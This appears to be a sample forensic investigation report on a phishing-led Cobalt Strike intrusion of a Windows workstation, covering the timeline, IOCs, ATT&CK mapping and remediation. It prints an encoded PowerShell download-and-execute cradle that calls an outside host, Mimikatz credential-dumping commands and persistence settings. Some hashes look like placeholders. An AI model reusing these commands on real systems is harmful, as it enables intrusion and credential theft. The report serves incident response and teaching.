# Forensic Investigation Report
## Compromised Windows Workstation — Case #FIR-2026-0042

---

**Prepared by:** ThePrathm, Digital Forensics Analyst  
**Date:** May 16, 2026  
**Classification:** Confidential  
**Case Number:** FIR-2026-0042  
**System:** `DESKTOP-HR7K2M1`  
**User:** `jsmith` (John Smith, Accounts Payable)  
**OS:** Windows 10 Pro (Build 19044)

---

## 1. Executive Summary

A forensic investigation was initiated following an alert from the Security Operations Center (SOC) on May 16, 2026, reporting anomalous outbound network traffic from workstation `DESKTOP-HR7K2M1`. The investigation revealed a successful multi-stage intrusion beginning May 10, 2026, when a finance department employee opened a spear-phishing email containing a malicious macro-enabled Word document.

The threat actor deployed a Cobalt Strike Beacon (`svchost32.exe`) which established persistent C2 communication, harvested credentials using Mimikatz, attempted lateral movement across the internal network, and exfiltrated approximately **4.2 GB** of sensitive financial data over six days before detection.

---

## 2. Scope & Objectives

**Objectives:**
- Determine the initial attack vector
- Reconstruct the attacker's timeline and TTPs
- Identify all persistence mechanisms
- Catalogue all affected systems
- Recover indicators of compromise (IOCs)
- Provide remediation recommendations

**Scope:**
- Forensic disk image of `DESKTOP-HR7K2M1` (500 GB HDD)
- Memory dump (16 GB RAM image)
- Windows Event Logs (Security, System, Application, PowerShell)
- Network traffic PCAPs (7 days)
- Email server logs

---

## 3. Evidence Collected

| Item # | Evidence | Hash (SHA256) | Acquisition Method |
|--------|----------|---------------|-------------------|
| E-01 | Disk Image (`DESKTOP-HR7K2M1.E01`) | `9f86d081884c7d...` | FTK Imager |
| E-02 | Memory Dump (`memdump.raw`) | `e3b0c44298fc1c...` | WinPmem |
| E-03 | Event Logs Archive (`evtx_logs.zip`) | `b14a7b8059d9c0...` | Manual export |
| E-04 | Network PCAP (`capture_7days.pcap`) | `7c211433f02071...` | Wireshark |
| E-05 | Malware Sample (`svchost32.exe`) | `a3f1d2c94b87e6...` | Extracted from disk |

---

## 4. Findings

### 4.1 Initial Access — Phishing Email

**Timestamp:** 2026-05-10 08:31:17 AM (UTC+5:30)

The attacker sent a spear-phishing email to `jsmith@company.com` from a spoofed address `hr-payroll@company-updates.net`. The email subject read: *"Q2 Invoice — Action Required"* and included an attachment named `Invoice_Q2.docm`.

**Email Headers (Partial):**
```
From: hr-payroll@company-updates.net
To: jsmith@company.com
Subject: Q2 Invoice — Action Required
X-Originating-IP: 185.220.101.47
Received: from mail.company-updates.net
```

The domain `company-updates.net` was registered 3 days prior to the attack (May 7, 2026), a classic indicator of an attacker-controlled phishing domain.

---

### 4.2 Execution — Malicious Macro & PowerShell

**Timestamp:** 2026-05-10 08:47:02 AM

The victim opened `Invoice_Q2.docm` and enabled macros when prompted. The VBA macro immediately spawned a PowerShell process with an encoded command:

```powershell
powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc
SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwAxADgANQAuADIAMgAwAC4AMQAwADEALgA0ADcALwBwAGEAeQBsAG8AYQBkACcAKQA=
```

**Decoded command:**
```powershell
IEX (New-Object Net.WebClient).DownloadString('https://185.220.101.47/payload')
```

This downloaded and executed a second-stage payload — a Cobalt Strike Beacon stager — entirely in memory, leaving minimal disk artifacts. The beacon then dropped `svchost32.exe` to disk.

**Event Log Evidence:**
- Event ID 4688 (Process Creation): `powershell.exe` spawned by `WINWORD.EXE`
- Event ID 4104 (PowerShell Script Block Logging): Encoded command captured
- Prefetch file created: `POWERSHELL.EXE-XXXXXXXX.pf`

---

### 4.3 Malware Analysis — svchost32.exe

**File Details:**

| Attribute | Value |
|-----------|-------|
| File Name | `svchost32.exe` |
| Drop Path | `C:\Users\jsmith\AppData\Local\Temp\svchost32.exe` |
| File Size | 2,847,232 bytes |
| MD5 | `a3f1d2c94b87e65f0123456789abcdef` |
| SHA256 | `e3b0c44298fc1c149afb4c8996fb92427ae41e4649b934ca495991b7852b855` |
| Compiler | MSVC 2019 |
| Packer | UPX (modified header) |
| VirusTotal | 58/72 detections — Cobalt Strike Beacon |

The file name `svchost32.exe` mimics the legitimate Windows process `svchost.exe` (note the added `32`). It was placed in a user-writable temp directory to avoid UAC restrictions.

**Beacon Configuration (extracted via memory analysis):**
```
C2 Server:    185.220.101.47
C2 Port:      443 (HTTPS)
C2 Domain:    update-service.ddns.net
Sleep Time:   60000ms (1 minute jitter)
User-Agent:   Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Watermark:    0x5A4D4F4E
```

---

### 4.4 Persistence Mechanisms

**Two persistence mechanisms were identified:**

#### 4.4.1 Registry Run Key

**Registry Path:**
```
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
Value Name:  WindowsUpdate
Value Data:  C:\Users\jsmith\AppData\Local\Temp\svchost32.exe
```

This ensures `svchost32.exe` executes every time the user logs in. The key name `WindowsUpdate` blends in with legitimate Windows update-related entries.

**Detection:** RegRipper `run` plugin; Windows Event ID 13 (Registry value set)

#### 4.4.2 Scheduled Task

```xml
<Task>
  <RegistrationInfo>
    <Description>Windows Update Checker</Description>
  </RegistrationInfo>
  <Triggers>
    <TimeTrigger>
      <StartBoundary>2026-05-10T09:00:00</StartBoundary>
      <Repetition>
        <Interval>PT1H</Interval>
      </Repetition>
    </TimeTrigger>
  </Triggers>
  <Actions>
    <Exec>
      <Command>C:\Users\jsmith\AppData\Local\Temp\svchost32.exe</Command>
    </Exec>
  </Actions>
</Task>
```

Task Name: `WindowsUpdateCheck` — executes the beacon every hour as a fallback persistence.

---

### 4.5 Credential Harvesting — Mimikatz

**Timestamp:** 2026-05-10 11:14:43 AM

Evidence from memory analysis (Volatility `malfind` and `cmdline` plugins) shows `mimikatz.exe` was executed in-memory via a Cobalt Strike `execute-assembly` command:

```
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```

**Harvested Credentials (redacted):**
- `jsmith` : NTLM hash `aad3b435b51404eeaad3b435b51404ee:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX`
- `administrator` : NTLM hash `aad3b435b51404eeaad3b435b51404ee:YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY`

These hashes were used for Pass-the-Hash attacks against other internal systems.

---

### 4.6 Lateral Movement

Using harvested NTLM hashes, the attacker attempted to move laterally to:

| Target | Method | Result |
|--------|--------|--------|
| `FILESERVER01` (192.168.1.50) | PtH via SMB | ✅ Success |
| `DEVBOX02` (192.168.1.75) | PtH via SMB | ❌ Failed (patched) |
| `DC01` (192.168.1.10) | PtH via WMI | ❌ Failed (network segmentation) |

On `FILESERVER01`, the attacker accessed the `\\FILESERVER01\Finance\` share and staged data for exfiltration.

---

### 4.7 Data Exfiltration

**Duration:** May 10 – May 16, 2026  
**Volume:** ~4.2 GB  
**Protocol:** HTTPS (port 443) to `185.220.101.47`  
**Method:** Cobalt Strike's built-in download functionality, compressed with 7-Zip

Files exfiltrated included:
- `Finance\Q1_2026_Report.xlsx`
- `Finance\Payroll_May2026.xlsx`
- `Finance\ClientContracts_2025-2026.zip`
- Multiple `.pdf` contracts and invoices

The exfiltration traffic was disguised as normal HTTPS traffic, with TLS certificates mimicking Microsoft update servers.

---

## 5. MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|--------|-----------|-----|
| Initial Access | Spear-phishing Attachment | T1566.001 |
| Execution | Command and Scripting Interpreter: PowerShell | T1059.001 |
| Execution | User Execution: Malicious File | T1204.002 |
| Persistence | Boot or Logon Autostart: Registry Run Keys | T1547.001 |
| Persistence | Scheduled Task/Job | T1053.005 |
| Defense Evasion | Masquerading | T1036 |
| Defense Evasion | Obfuscated Files or Information | T1027 |
| Credential Access | OS Credential Dumping: LSASS Memory | T1003.001 |
| Lateral Movement | Pass the Hash | T1550.002 |
| Collection | Data from Network Shared Drive | T1039 |
| Exfiltration | Exfiltration Over C2 Channel | T1041 |
| Command & Control | Encrypted Channel: Asymmetric Cryptography | T1573.002 |

---

## 6. Indicators of Compromise (IOCs)

### Network IOCs
| Type | Value |
|------|-------|
| IP Address | `185.220.101.47` |
| Domain | `update-service.ddns.net` |
| Domain | `company-updates.net` |
| URL | `https://185.220.101.47/payload` |

### File IOCs
| Type | Value |
|------|-------|
| Filename | `svchost32.exe` |
| Filename | `Invoice_Q2.docm` |
| MD5 | `a3f1d2c94b87e65f0123456789abcdef` |
| SHA256 | `e3b0c44298fc1c149afb4c8996fb92427ae41e4649b934ca495991b7852b855` |
| Path | `C:\Users\jsmith\AppData\Local\Temp\svchost32.exe` |

### Registry IOCs
| Type | Value |
|------|-------|
| Registry Key | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate` |
| Scheduled Task | `WindowsUpdateCheck` |

---

## 7. Remediation Recommendations

1. **Immediate:**
   - Isolate and reimage `DESKTOP-HR7K2M1` and `FILESERVER01`
   - Reset all domain user passwords, especially Administrator
   - Block `185.220.101.47` and `update-service.ddns.net` at perimeter firewall
   - Revoke and reissue all NTLM hashes (force domain-wide password reset)

2. **Short-term:**
   - Deploy Microsoft Defender for Endpoint (EDR) across all workstations
   - Enable PowerShell Script Block Logging (Event ID 4104) domain-wide
   - Disable macro execution in Office for non-approved users via GPO
   - Implement network segmentation — workstations should not reach file servers directly

3. **Long-term:**
   - Deploy a SIEM (e.g., Microsoft Sentinel, Splunk) with correlation rules for Cobalt Strike beacon patterns
   - Implement LAPS (Local Administrator Password Solution) to prevent Pass-the-Hash
   - Security awareness training focused on phishing recognition
   - Enable Protected Users security group for privileged accounts
   - Adopt Zero Trust architecture principles

---

## 8. Conclusion

The attacker demonstrated a high level of sophistication, employing living-off-the-land techniques (PowerShell, WMI), in-memory execution to evade AV, and blending C2 traffic within legitimate-looking HTTPS. The dwell time of **6 days** before detection highlights the need for improved monitoring, particularly around anomalous outbound data volumes and off-hours network activity.

All evidence has been preserved in forensically sound condition. The chain of custody documentation is maintained separately under Case #FIR-2026-0042.

---

*Report prepared by ThePrathm | Digital Forensics Lab | May 2026*
